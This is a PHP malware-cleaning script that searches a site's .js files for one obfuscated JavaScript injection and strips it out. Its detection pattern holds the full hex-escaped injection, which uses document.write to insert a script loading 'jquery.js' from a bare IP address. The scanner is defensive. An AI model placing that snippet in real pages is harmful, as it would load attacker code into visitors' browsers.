<?php
error_reporting(E_ALL  ^ E_NOTICE ^ E_WARNING );
echo "<h1>Regex Search</h1>";
echo "Thanks for waiting!<br />";
ob_flush();
flush();
usleep(500);

//exit;
function microtime_float(){
    list($usec, $sec) = explode(" ", microtime());
    return ((float)$usec + (float)$sec);
}
$time_start = microtime_float(); // tick count

//File Scanner

$malware_scanner = new MalwareScanner();
echo "_0xaae8";

$time_end = microtime_float();
$time = $time_end - $time_start;
echo '<br />Time:'.$time;
?>
<?php
/*
    Malware Scanner

*/

class MalwareScanner{
    public $root_dir;
    public $files_type = array('.js');
    public $directories = array();
    public $patterns;
    public $datainfected = 0;
    public $fileinfected = 0;
    public $files_infected = array();

    //File Signature
    public $malPatterns = array(
        "(var _0xaae8=\[\"\",\"\\\\x6A\\\\x6F\\\\x69\\\\x6E\",\"\\\\x72\\\\x65\\\\x76\\\\x65\\\\x72\\\\x73\\\\x65\",\"\\\\x73\\\\x70\\\\x6C\\\\x69\\\\x74\",\"\\\\x3E\\\\x74\\\\x70\\\\x69\\\\x72\\\\x63\\\\x73\\\\x2F\\\\x3C\\\\x3E\\\\x22\\\\x73\\\\x6A\\\\x2E\\\\x79\\\\x72\\\\x65\\\\x75\\\\x71\\\\x6A\\\\x2F\\\\x38\\\\x37\\\\x2E\\\\x36\\\\x31\\\\x31\\\\x2E\\\\x39\\\\x34\\\\x32\\\\x2E\\\\x34\\\\x33\\\\x31\\\\x2F\\\\x2F\\\\x3A\\\\x70\\\\x74\\\\x74\\\\x68\\\\x22\\\\x3D\\\\x63\\\\x72\\\\x73\\\\x20\\\\x74\\\\x70\\\\x69\\\\x72\\\\x63\\\\x73\\\\x3C\",\"\\\\x77\\\\x72\\\\x69\\\\x74\\\\x65\"\];document\[_0xaae8\[5\]\]\(_0xaae8\[4\]\[_0xaae8\[3\]\]\(_0xaae8\[0\]\)\[_0xaae8\[2\]\]\(\)\[_0xaae8\[1\]\]\(_0xaae8\[0\]\)\))"
    );
    public function __construct(){
        /* File scanner */
        echo "<br /><br />FILE SCAN<br />";
        ob_flush();
        flush();
        usleep(200);
        $this->patterns = '('.implode('|', $this->malPatterns).')';
        $this->root_dir = getcwd();
        $this->directories[] = $this->root_dir;
        $dirs= $this->getBaseDir($this->root_dir);
        $this->getSubDir($dirs);
        $this->startScan($this->directories);
        $this->fileReport();
    }

    /* File Scan */

    public function getBaseDir($base_dir){
        $dirs = glob($base_dir.'/*',GLOB_ONLYDIR);
        return $dirs;
    }
    public function getSubDir($dirs){
        foreach($dirs as $dir) {
            $this->directories[] = $dir;
            $sub_dirs = $this->getBaseDir($dir);
            $this->getSubDir($sub_dirs);
        }
    }
    public function startScan(){
        $count = 1;
        foreach($this->directories as $dir){
            foreach($this->files_type as $file_type) {
                $files = glob($dir . '/*'.$file_type);
                if(!empty($files)) {
                    $this->malwareDectect($files);
                    $count++;
                }
            }
        }
        echo $count." files were scanned";
        echo "<br />".$this->fileinfected." file(s) infected <br />";

    }
    public function malwareDectect($files){
        if(is_array($files)){
            foreach($files as $file){
                $file_content = file_get_contents($file);
                $numMatches = null;
                $numMatches = preg_match_all('/'.$this->patterns.'/' , $file_content,$matches);
                if(!empty($numMatches)){
                    $fileContents = file($file);
                    $fileContents[0] = preg_replace('/'.$this->patterns.'/','',$fileContents[0]);
                    // Write the file back
                    $newContent = implode("", $fileContents);

                    $fp = fopen($file, "w+");   // w+ means create new or replace the old file-content
                    fputs($fp, $newContent);
                    fclose($fp);
                    $this->files_infected[] = $file;
                    $this->fileinfected += 1;

                }

            }
        }
    }
    public function fileReport(){
        foreach($this->files_infected as $file){
            echo $file."<br />";
        }
    }

}

?>
